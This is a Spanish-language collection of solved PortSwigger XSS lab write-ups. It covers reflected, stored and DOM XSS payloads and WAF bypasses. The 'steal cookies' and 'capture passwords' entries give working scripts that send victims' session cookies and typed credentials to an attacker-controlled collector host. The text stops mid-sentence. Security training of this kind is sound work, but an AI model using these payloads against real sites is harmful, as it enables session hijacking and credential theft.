---
title: XSS | PortSwigger
---
Labs de XSS hechos y explicados

#### Laboratorio: XSS reflejado en contexto HTML sin nada codificado

``` html
// Simplemente ponemos esto en la barra de busqueda:
<script>alert("texto")</script>
```
--------
#### Laboratorio: XSS almacenado en contexto HTML sin nada codificado

``` html
// La vulnerabilidad si encuentra en la caja de comentarios, por lo que podemos poner el mismo script de antes a la hora de comentar
<script>alert("texto")</script>
```
-------
#### Laboratorio: DOM XSS en document.write sink usando source location.search

``` js
// Mirando el codigo de la función document.write en el codigo fuente de la pagina:
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
// Podemos observar como la etiqueta img no está cerrada, por lo que podemos meterle más código:
"><svg onload=alert("texto")>
// De esta manera, nos imprimirá todo aquello que le introduzcamos por pantalla.
```
----------
#### Laboratorio DOM XSS in innerHTML sink using source location.search

``` js
// El error se encuentra en la siguiente función dentro del código:
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;}
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
doSearchQuery(query)
;}
// Aqui dice: si la query es correcta, buscame lo que pida la query. Pero ¿Y si es incorrecta? No hace nada para el caso else. Por ello, podemos meterle cualquier query erronea, como por ejemplo una imagen, pero con la condición de si da error, que sale un alert() por pantalla:
<img src=1 onerror=alert(1)>
```
---------
#### Laboratorio: DOM XSS in jQuery anchor href attribute sink using location.search source

``` js
// Mirando el código fuente de la pagina, podemos ver como la parte vulnerable es esta:
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
// Lo que hace es atriburile al elemento href lo que se le pase por URL, sin controlar dicho input. Por lo tanto, la solución a este laboratorio es añadir 
javascript:alert(document.cookie)
// despues del "returnPath" en la URL de la pagina web.
```
------
#### DOM XSS en jQuery selector sink usando un evento hashchange

``` js
// El código vulnerable de la pagina es el siguiente:
  $(window).on('hashchange', function(){
      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
       if (post) post.get(0).scrollIntoView();
// Sobre todo la siguiente accion
.slice(1)
// La cual se usa para borrar la posicion en N (que en este caso es 1), que en nuestro caso es el #.
// Por lo tanto, sin el elemento # , tenemos el control sobre cualquier fuente que no lo requiera. 
// Para resolver este lab, hemos de enviarle el exploit a la victima usando el exploit server del lab e introduciendo la siguiente query en la parte del Body:
<iframe src="https://0ad100cb03f5d10fc3545372018d0057.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
// Importante ver que se ha añadido el # al final de la URL (porque la funcion .slice(1) se lo ha borrado) para redigirla a cualquier lugar de nuestro interés.
```
-------
#### XSS reflejado en atributo con paréntesis angulares codificados en HTML

``` js
// Si introducimos cualquier cadena de texto en la barra de busqueda, vemos como esta se ve reflejada en la URL pero entre comillas '', por lo que podemos escapar estas comillas e inyectar código malicioso:
"onmouseover="alert(1)
// De esta manera nos aparecerá una alerta en la pagina web.
```
-------
#### XSS almacenado en atributo anchor href con comillas dobles codificado en HTML

``` js
// Como sabemos que la parte vulnerable de la pagina es la caja de comentarios, vamos a introducir cualquier cosa y luego ver donde se expone en el codigo fuente de la pagina.
// Mirando bien, vemos que el campo de "web page" luego se transforma en un href dentro del código fuente:
 <a id="author" href="https://admin.com">username</a> 
// Por lo tanto, dentro del campo web page, ponemos un alert de java script:
javascript:alert(2)
// Y ya tendríamos el lab resuelto
```
------
#### XSS reflejado en una cadena JavaScript con corchetes angulares codificado en HTML

``` js
// Cualquier cosa que buscamos en la barra de tareas se guarda entre '', por lo que podemos escapar y provocar una alerta:
';alert(1)//
```
-----------
#### DOM XSS en document.write sink usando source location.search dentro de un elemento select

``` js
// Vamos a ver que parte del back-end de la pagina aguarda nuestra intereacción, y vemos que es esta:
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
// Aquí el código lo que hace es almacenar el valor de la query en la variable "store", y posteriormente comprueba su valor en el if. Si el resultado es true (es decir, existe el storeId), entra en document.write y escribe el store+/option. Por lo tanto, nosotros podemos inyectar un payload dentro del campo de StoreId, ya que no este no es sanetizado. Por ende, basta con añadir este código a la url:
&storeId=<script>alert(2)</script>
```
----------
#### DOM XSS en expresión AngularJS con paréntesis angulares y comillas dobles codificado en HTML

``` js
// Como los scripts de AngularJs se ejecutan usando {{}}, vemos que es propenso a inyecciones de tipo SSTI. Además de esto, se usa el atributo ng-app, por lo que le metemos un payload con alert():
{{this.constructor.constructor('alert("lo_que_sea")')()}}
// La manera en la que esto funciona es sencilla:
// Si nosotros ponemos un script en Angular como por ejemplo puede ser {{alert(1)}}, el Sandboxing de Angular nos lo bloqueará, por lo tanto, necesitamos escaparnos de este sandbox de alguna manera para poder ejecutar código malicioso. Por lo tanto, como estamos ante un ng-app vulnerable, podemos usar el atributo 
.constructor() // Para "crear" código nuevo.
```
---------
#### DOM XSS reflejado

``` js
// Interceptado con burp en la pestaña de HTTP History, vemos que toda respuesta devuelve el parámetro buscado en formato Json. Además de esto, se procesa usando la funcion eval(), por lo que hay que intentar escapar dicha busqueda:
\"-alert(1)}//
```
------
#### Stored DOMGestores de contenido XSS
``` js
// Enviando un comentario y buscando la petición en el HTTP History de burp, podemos ver como se llama al archivo 
loadCommentsWithVulnerableEscapeHtml.js // Por lo que vamos a inspeccionarlo:
// Mirando su codigo fuente, vamos a buscar elementos .innerHTML (sabiendo que es un DOM), y encontramos la siguiente función:
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
// La cual reemplaza los <>. No obstante, cuando el primer argumento es un string, simplemente reemplaza los primeros <> encontrados, dejando el resto intactos, por lo que le podemos meter un payload de este estilo:
<><img src=1 onerror=alert(1)>
// De esta manera, solamente se html-encodearán el <> del inicio.
```
---------
#### Exploiting cross-site scripting to steal cookies

``` js
// Como el usuario victima verá cualquier comentario publicado, tenemos que crear un comentario que le saque la cookie y nos la envie a nostros (mediante el burp collaborator). 
// Creamos un script que introduciremos al campo de comentarios:
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { // fetch en este caso se interpreta como "enviamelo a esta URL"
method: 'POST', // Usamos metodo POST para subir el comentario
mode: 'no-cors', // No accedemos al body de la pagina a la que le hacemos fetch, sino que introducimos el nuestro propio.
body:document.cookie // Simplemente le sacamos la cookie
});
</script>
// Este script hará que cualquier persona que vea el comentario cree un post con su cookie de sesión (la cual será redirigida a nuestro servidor de burp).
// Hacemos Poll-now en el collaborator y ya tenemos la cookie de la victima
```
------------
#### Exploiting cross-site scripting to capture passwords

``` js
<input name=username id=username>
<input type=password name=password onchange="fetch('https://destino',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

//Con este script, conseguimos mandarnos los campos campos user y password(cuando esta se cambie) a nuestro servidor de burp collaborator siempre que una persona vea nuestro post.
// También se puede hacer usando XMLHttpRequest:
<input name=username id=username>
<input type=password name=password id=password onchange="Capture()">
<script>
function Capture()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://destino.com/?username=" + user + "&password=" + pass, true)
xhr.send();
}
</script>
```
----------
#### Reflected XSS into HTML context with most tags and attributes blocked


``` html
// Interceptamos una peticion de busqueda con Burp, la matamos al repeater y metemos <test> dentro del campo search, donde test será el campo a brute-forcear en busqueda de los tags que by-paseen el WAF. Encontramos que body es un tag valido. Ahora toca buscar un evento para inyectar el comando print().
// Entonces añadimos <body%20a=> al campo search del intruder, donde 'a' será el campo a brute-forcear en busqueda del evento. Vemos que onresize es un evento válido con la etiqueta body, por lo que vamos a crear un exploit que le mandaremos a la victima:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'> // Tenemos que añadirle "onload" para que se active el evento "onresize" al cargarse la pagina del <iframe>
//URL ENCODEADO: 
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
-----------
#### Reflected XSS into HTML context with all tags blocked except custom ones

``` html
// Simplemente creamos un tag personalizado, el cual url-encodeamos y mandamos a la victima:
<script>
location = "https://0a4d002603441d94c0abdd07003f008e.web-security-academy.net/?search=/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x"
</script>
// Usamos location para hacer una redireccion a una URL de nuestro interés.
```
--------
#### Reflected XSS with some SVG markup allowed

``` html
// Primero, vamos a ver los tags que se pueden usar (usando el intruder). Nos reporta:
<svg>,<animatetransform>, <title> y <image>
// Ahora toca brute-forcear el evento. Y vemos que solo tenemos uno válido:
onbegin
// De esta manera, buscando un poco por el XSS cheatsheet payload de portswigger encontramos esto:
<svg><animatetransform onbegin=alert(1) attributeName=transform>
// El cual nos permite solucionar el laboratorio.
```
-------
#### Reflected XSS in canonical link tag

``` html
// Si observamos el codigo fuente de la pagina en su apartado home, podemos ver como tiene un 
<link rel="canonical"> // Cuando veamos este tag en un link, significa que es un duplicado de la URL especificada.
// Además, estos tags tienen un atributo llamado "accesskey" el cual funciona es llamado cuando presionamos el short cut que definimos en el.
// Por lo tanto, podemos ingresar el codigo de este atributo directamente en la URL de la pagina de la siguiente manera:

https://0ace00c7037fef83c0b9457e002e00cb.web-security-academy.net/?'accesskey='x'onclick='alert(1)
//URL encodeado:
https://0ace00c7037fef83c0b9457e002e00cb.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

// Inyectando este comando, al usar el atajo sacamos un reflected XSS por pantalla.
```
-------------
#### Reflected XSS into a JavaScript string with single quote and backslash escaped

``` js
// Metiendo cualquier input en la barra de búsqueda, vemos que se guarda de la siguiente manera en el back-end de la pagina:
var searchTerms = 'test';
// Si probamos a meter un string con una ' al final para cerrar el string, nos reporta esto:
var searchTerms = 'test\'payload'; // pone la \ para evitar que nos salgamos del string actual. No obstante, vamos a probar a cerrar tags si ponemos la sintaxis correspondiente. Cosa que si nos deja hacer.
// Por lo tanto, podemos cerrar el script de javaScript en el cual nos encontramos únicamente poniendo </script> en la barra de busqueda y posteriormente declarando nuestro propio script para sacar un alert(1) por pantalla, por lo que la sintaxis para solucionar el lab sería esta:
</script><script>alert("lo_que_sea")</script>
```
---------
#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

``` js
// Si nosotros metemos el siguiente payload por ejemplo:
'test
// Nos lo interpreta asi en el back-end:
var searchTerms = '\'test';
// Si ponemos 
'\test
var searchTerms = '\'\test';
// Como vemos nos añade un \ al inicio de cada string que metamos, asi que vamos a meter un \ nosotros mismos al inicio del string para escapar lo que hay despues:
\\';alert(1)//
// Al meter nosotros mismos el primer \, le decimos al programa que interprete el segundo \ de manera literal, no como un caracter especial. Por lo tanto, la comilla despues del segundo \ es interpretada como un comentario, por lo que la interpretación que hace la pagina web por detrás es esta:
\';alert(1)//
// Y nos lo interpreta como una orden como tal, no como un string, por lo que nos imprime un alert() por pantalla.
```
----------
#### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

``` html
// Vemos que nuestro input del campo website (que es el k nos interesa infectar) se guarda dentro dentro de una etiqueta <onclick>, por lo que se ejecutará al ser presionado. 
// Introduciendo por ejemplo este input:
http://foo?&apos;test
// Vemos que se guarda asi: 
href="http://foo?&apos;test" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;test');">admin</a> /// (&apos está de otro color, por lo que se interpreta como endidad, por lo tanto podemos usarlo para escaparnos del script actual e introducir código que deseemos. En este caso un alert()).
// &apos es la version URL-Encodeada de la comilla simple ('), pero tenemos que ponerlo de esta manera porque el buscador url-desencodea todo lo que le es pasado al tag <onclick> antes de que se interprete el JavaScript en si

// Por lo tanto, como sabemos que podemos by-passear el script usando &apos; vamos a inyectarle un alert:
http://lo_k_sea?&apos;-alert("lo_que_sea")-&apos;
```
---------
#### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

``` js
// Si buscamos cualquier cosa en la barra de busqueda, podemos ver como esta se guarda en una cadena template literal en el backend:
var message = `0 search results for 'nuestro_input'`;
// Como dato, las templates de javascript permiten la ejecución de expresiones en su interior (es decir, si metemos un alert entre las ``, nos lo sacará por pantalla)
// Por lo tanto, solamente tenemos que incrustar un alert(1) dentro, y esto lo hacemos introduciendo esto en la barra de busqueda:
${alert(1)}
```
---------
#### Reflected XSS with event handlers and href attributes blocked

```
// Investigando por gulugulu vemos un post de PortSwigger explicando mas o menos como hacer este laboratorio:
https://portswigger.net/research/svg-animate-xss-vector
// En el, podemos ver que crea una alternativa a href, pero usando <svg> y su evento "animate". No obstante, su codigo contiene palabras bloqueadas por nuestro WAF, asi que hay que buscar una alternativa:
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
// Expliquemos el código por partes:
<svg> // Para indicar que estamos ante un svg, obviamente
<a></a> /// Para indicar que crearemos un hipervícnulo
<animate attributeName> // Indicamos el nombre de la propiedad CSS o atributo ("text en nuestro caso") del elemento destino que va a ser cambiado durante una animación (por eso usamos animate). Además, hemos de poner =href, pues es el atributo que estamos interesados en utilizar para los redireccionamientos
href values=javascript:alert(1) // Lo que pasará cuando hagamos click.
<text x=20 y=20>Click me</text> /// Simplemente definimos el aspecto del texto "Click Me". Para poder darle f
```